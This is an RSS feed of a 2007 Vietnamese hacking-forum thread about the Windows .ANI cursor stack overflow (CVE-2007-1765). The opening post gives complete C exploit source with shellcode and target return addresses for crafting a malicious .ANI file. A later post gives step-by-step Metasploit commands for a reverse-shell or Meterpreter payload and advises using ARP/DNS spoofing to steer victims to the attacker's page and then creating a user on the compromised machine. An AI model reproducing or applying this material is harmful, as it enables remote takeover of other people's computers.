<?xml version="1.0" encoding="UTF-8"?>
<rss version="2.0">
	<channel>
		<title><![CDATA[Latest posts for the topic "Lỗi tràn bộ đệm ở file ani - con trỏ chuột"]]></title>
		<link>http://www.hvaonline.net/hvaonline/posts/list/13.html</link>
		<description><![CDATA[Latest messages posted in the topic "Lỗi tràn bộ đệm ở file ani - con trỏ chuột"]]></description>
		<generator>JForum - http://www.jforum.net</generator>
			<item>
				<title>Lỗi tràn bộ đệm ở file ani - con trỏ chuột</title>
				<description><![CDATA[ Lỗi tràn bộ đệm xảy ra ở hàm LoadAniIcon() ,nguy hại ở mọi phiên bản IE  ( tôi đã thử nghiệm thành công )

<span class="quotetxt"><b>Code:</b></span><br/>
		<div class="coded"">
		<pre>Copyright &#40;c&#41; 2007 devcode
*
*
*			^^ D E V C O D E ^^
*
* Windows .ANI LoadAniIcon Stack Overflow
* &#91;CVE-2007-1765&#93;
*
*
* Description:
*    A vulnerability has been identified in Microsoft Windows,
*	  which could be exploited by remote attackers to take complete
*	  control of an affected system. This issue is due to a stack overflow
*    error within the "LoadAniIcon&#40;&#41;" &#91;user32.dll&#93; function when rendering
*    cursors, animated cursors or icons with a malformed header, which could
*	  be exploited by remote attackers to execute arbitrary commands by
*    tricking a user into visiting a malicious web page or viewing an email
*    message containing a specially crafted ANI file.
*
* Hotfix/Patch:
*    None as of this time.
*
* Vulnerable systems:
*	  Microsoft Windows 2000 Service Pack 4
*	  Microsoft Windows XP Service Pack 2
*	  Microsoft Windows XP 64-Bit Edition version 2003 &#40;Itanium&#41;
*	  Microsoft Windows XP Professional x64 Edition
*	  Microsoft Windows Server 2003
*	  Microsoft Windows Server 2003 &#40;Itanium&#41;
*	  Microsoft Windows Server 2003 Service Pack 1
*	  Microsoft Windows Server 2003 Service Pack 1 &#40;Itanium&#41;
*	  Microsoft Windows Server 2003 x64 Edition
*	  Microsoft Windows Vista
*
*	  Microsoft Internet Explorer 6
*	  Microsoft Internet Explorer 7
*
*    This is a PoC and was created for educational purposes only. The
*	  author is not held responsible if this PoC does not work or is
*	  used for any other purposes than the one stated above.
*
* Notes:
*	  For this to work on XP SP2 on explorer.exe, DEP has to be turned
*	  off.
*
*/
#include &lt;iostream&gt;

/* ANI Header */
unsigned char uszAniHeader&#91;&#93; =
"\x52\x49\x46\x46\x00\x04\x00\x00\x41\x43\x4F\x4E\x61\x6E\x69\x68"
"\x24\x00\x00\x00\x24\x00\x00\x00\xFF\xFF\x00\x00\x0A\x00\x00\x00"
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
"\x10\x00\x00\x00\x01\x00\x00\x00\x54\x53\x49\x4C\x03\x00\x00\x00"
"\x10\x00\x00\x00\x54\x53\x49\x4C\x03\x00\x00\x00\x02\x02\x02\x02"
"\x61\x6E\x69\x68\xA8\x03\x00\x00";

/* Shellcode - metasploit exec calc.exe ^^ */
unsigned char uszShellcode&#91;&#93; =
"\xeb\x03\x59\xeb\x05\xe8\xf8\xff\xff\xff\x49\x49\x49\x49\x49\x49"
"\x49\x49\x49\x49\x49\x49\x49\x37\x49\x49\x49\x49\x51\x5a\x6a\x42"
"\x58\x50\x30\x41\x31\x42\x41\x6b\x41\x41\x52\x32\x41\x42\x41\x32"
"\x42\x41\x30\x42\x41\x58\x50\x38\x41\x42\x75\x38\x69\x79\x6c\x4a"
"\x48\x67\x34\x47\x70\x77\x70\x53\x30\x6e\x6b\x67\x35\x45\x6c\x4c"
"\x4b\x73\x4c\x74\x45\x31\x68\x54\x41\x68\x6f\x6c\x4b\x70\x4f\x57"
"\x68\x6e\x6b\x71\x4f\x45\x70\x65\x51\x5a\x4b\x67\x39\x4c\x4b\x50"
"\x34\x4c\x4b\x77\x71\x68\x6e\x75\x61\x4b\x70\x4e\x79\x6e\x4c\x4d"
"\x54\x4b\x70\x72\x54\x65\x57\x69\x51\x49\x5a\x46\x6d\x37\x71\x6f"
"\x32\x4a\x4b\x58\x74\x77\x4b\x41\x44\x44\x64\x35\x54\x72\x55\x7a"
"\x45\x6c\x4b\x53\x6f\x51\x34\x37\x71\x48\x6b\x51\x76\x4c\x4b\x76"
"\x6c\x50\x4b\x6e\x6b\x71\x4f\x67\x6c\x37\x71\x68\x6b\x4c\x4b\x65"
"\x4c\x4c\x4b\x64\x41\x58\x6b\x4b\x39\x53\x6c\x75\x74\x46\x64\x78"
"\x43\x74\x71\x49\x50\x30\x64\x6e\x6b\x43\x70\x44\x70\x4c\x45\x4f"
"\x30\x41\x68\x44\x4c\x4e\x6b\x63\x70\x44\x4c\x6e\x6b\x30\x70\x65"
"\x4c\x4e\x4d\x6c\x4b\x30\x68\x75\x58\x7a\x4b\x35\x59\x4c\x4b\x4d"
"\x50\x58\x30\x37\x70\x47\x70\x77\x70\x6c\x4b\x65\x38\x57\x4c\x31"
"\x4f\x66\x51\x48\x76\x65\x30\x70\x56\x4d\x59\x4a\x58\x6e\x63\x69"
"\x50\x31\x6b\x76\x30\x55\x38\x5a\x50\x4e\x6a\x36\x64\x63\x6f\x61"
"\x78\x6a\x38\x4b\x4e\x6c\x4a\x54\x4e\x76\x37\x6b\x4f\x4b\x57\x70"
"\x63\x51\x71\x32\x4c\x52\x43\x37\x70\x42";

char szIntro&#91;&#93; =
"\n\t\tWindows .ANI LoadAniIcon Stack Overflow\n"
"\t\t\tdevcode &#40;c&#41; 2007\n"
"&#91;+&#93; Targets:\n"
"\tWindows XP SP2 &#91;0&#93;\n"
"\tWindows 2K SP4 &#91;1&#93;\n\n"
"Usage: ani.exe &lt;target&gt; &lt;file&gt;";

typedef struct {
	const char *szTarget;
	unsigned char uszRet&#91;5&#93;;
} TARGET;

TARGET targets&#91;&#93; = {
	{ "Windows XP SP2", "\xC9\x29\xD4\x77" },	/* call esp */
	{ "Windows 2K SP4", "\x29\x4C\xE1\x77" }
};

int main&#40; int argc, char **argv &#41; {
	char szBuffer&#91;1024&#93;;
	FILE *f;

	if &#40; argc &lt; 3 &#41; {
		printf&#40;"%s\n", szIntro &#41;;
		return 0;
	}

	printf&#40;"&#91;+&#93; Creating ANI header...\n"&#41;;
	memset&#40; szBuffer, 0x90, sizeof&#40; szBuffer &#41; &#41;;
	memcpy&#40; szBuffer, uszAniHeader, sizeof&#40; uszAniHeader &#41; - 1 &#41;;

	printf&#40;"&#91;+&#93; Copying shellcode...\n"&#41;;
	memcpy&#40; szBuffer + 168, targets&#91;atoi&#40; argv&#91;1&#93; &#41;&#93;.uszRet, 4 &#41;;
	memcpy&#40; szBuffer + 192, uszShellcode, sizeof&#40; uszShellcode &#41; - 1 &#41;;

	printf&#40;"%s\n", argv&#91;2&#93; &#41;;
	f = fopen&#40; argv&#91;2&#93;, "wb" &#41;;
	if &#40; f == NULL &#41; {
		printf&#40;"&#91;-&#93; Cannot create file\n"&#41;;
		return 0;
	}

	fwrite&#40; szBuffer, 1, 1024, f &#41;;
	fclose&#40; f &#41;;
	printf&#40;"&#91;+&#93; .ANI file succesfully created!\n"&#41;;
	return 0;
}</pre>
		</div>]]></description>
				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/list/8699.html#50890</guid>
				<link>http://www.hvaonline.net/hvaonline/posts/list/8699.html#50890</link>
				<pubDate><![CDATA[Sun, 1 Apr 2007 01:22:21]]> GMT</pubDate>
				<author><![CDATA[ xnohat]]></author>
			</item>
			<item>
				<title>Re: Lỗi tràn bộ đệm ở file ani - con trỏ chuột</title>
				<description><![CDATA[ Bác hướng dẫn cách khai thác lỗi này đi. Viết đoạn mã nguồn C đó rồi làm thế nào nữa]]></description>
				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/list/8699.html#54227</guid>
				<link>http://www.hvaonline.net/hvaonline/posts/list/8699.html#54227</link>
				<pubDate><![CDATA[Tue, 17 Apr 2007 03:58:33]]> GMT</pubDate>
				<author><![CDATA[ Huyx]]></author>
			</item>
			<item>
				<title>Re: Lỗi tràn bộ đệm ở file ani - con trỏ chuột</title>
				<description><![CDATA[ Cứ theo đúng cái này không chạy được đâu, đây chỉ là đoạn mã gây crash -- shellcode chỉ là che mắt :), nhưng chỉnh sửa một chút là OKIE]]></description>
				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/list/8699.html#54983</guid>
				<link>http://www.hvaonline.net/hvaonline/posts/list/8699.html#54983</link>
				<pubDate><![CDATA[Sat, 21 Apr 2007 03:11:19]]> GMT</pubDate>
				<author><![CDATA[ meoconbka]]></author>
			</item>
			<item>
				<title>Lỗi tràn bộ đệm ở file ani - con trỏ chuột</title>
				<description><![CDATA[ khai thác trong metasploit 3.0 đã update mới nhất
dùng command nhé

&gt;&gt; show exploits

&gt;&gt; use windows/browser/ani_loadimage_chunksize

&gt;&gt; show payloads

&gt;&gt; set PAYLOAD (windows/shell_reverse_tcp hoặc    windows/meterpreter/reverse_tcp)

&gt;&gt; show options

&gt;&gt; set SRVPORT ____(port) vd:80

&gt;&gt; set URIPATH ____(web) vd: /BHAT

&gt;&gt; set LHOST ______ (ip)vd: 10.0.10.2

&gt;&gt; exploit
( vi dụ khai thác )

[*] Started reverse handler
[*] Using URL:<span class="link"> http://10.0.10.2:80/BHAT</span>
[*] Server started.
[*] Exploit running as background job.

[*] Command shell session 1 opened (10.0.10.2:4444 -&gt; 10.0.0.11:1280)

&gt;&gt; sessions -i 1

mình đã dính đoạn code khai thác vào<span class="link"> http://10.0.10.2:80/BHAT</span>

việc còn lại là cho người sẽ bị khai thác vào đúng cái web mình dã dựng lên.
Đơn giản là các bạn dùng Cain để ARP spoofing cái DNS, vd: khi nó vào trang web nào đó thì sẽ đẩy sang trang web của mình. để yên cho metasploit khai thác.
sau khi khai thác thì việc chiếm shell ok. 
tạo user rồi enjoy.


có gì thắc mắc trong việc test. pm thoải mái. OK
have fun]]></description>
				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/list/8699.html#55042</guid>
				<link>http://www.hvaonline.net/hvaonline/posts/list/8699.html#55042</link>
				<pubDate><![CDATA[Sat, 21 Apr 2007 13:20:27]]> GMT</pubDate>
				<author><![CDATA[ SuicideBlackMan]]></author>
			</item>
			<item>
				<title>Lỗi tràn bộ đệm ở file ani - con trỏ chuột</title>
				<description><![CDATA[ <p></p>
		<cite class="blockquote">SuicideBlackMan wrote:</cite><br>
		<blockquote>khai thác trong metasploit 3.0 đã update mới nhất
dùng command nhé

&gt;&gt; show exploits

&gt;&gt; use windows/browser/ani_loadimage_chunksize

&gt;&gt; show payloads

&gt;&gt; set PAYLOAD (windows/shell_reverse_tcp hoặc    windows/meterpreter/reverse_tcp)

&gt;&gt; show options

&gt;&gt; set SRVPORT ____(port) vd:80

&gt;&gt; set URIPATH ____(web) vd: /BHAT

&gt;&gt; set LHOST ______ (ip)vd: 10.0.10.2

&gt;&gt; exploit
( vi dụ khai thác )

[*] Started reverse handler
[*] Using URL:<span class="link"> http://10.0.10.2:80/BHAT</span>
[*] Server started.
[*] Exploit running as background job.

[*] Command shell session 1 opened (10.0.10.2:4444 -&gt; 10.0.0.11:1280)

&gt;&gt; sessions -i 1

mình đã dính đoạn code khai thác vào<span class="link"> http://10.0.10.2:80/BHAT</span>

việc còn lại là cho người sẽ bị khai thác vào đúng cái web mình dã dựng lên.
Đơn giản là các bạn dùng Cain để ARP spoofing cái DNS, vd: khi nó vào trang web nào đó thì sẽ đẩy sang trang web của mình. để yên cho metasploit khai thác.
sau khi khai thác thì việc chiếm shell ok. 
tạo user rồi enjoy.


có gì thắc mắc trong việc test. pm thoải mái. OK
have fun&nbsp;
		</blockquote>

Dùng tools thì đơn giản quá, phải tự mình làm mới khoái chứ  :evil: 

Gợi ý cho cái code C ở trên nhá --&gt; Cái jmp esp phải thay thế cho đúng --&gt; thía thôi  :lol:) ]]></description>
				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/list/8699.html#55119</guid>
				<link>http://www.hvaonline.net/hvaonline/posts/list/8699.html#55119</link>
				<pubDate><![CDATA[Sat, 21 Apr 2007 21:53:01]]> GMT</pubDate>
				<author><![CDATA[ meoconbka]]></author>
			</item>
	</channel>
</rss>
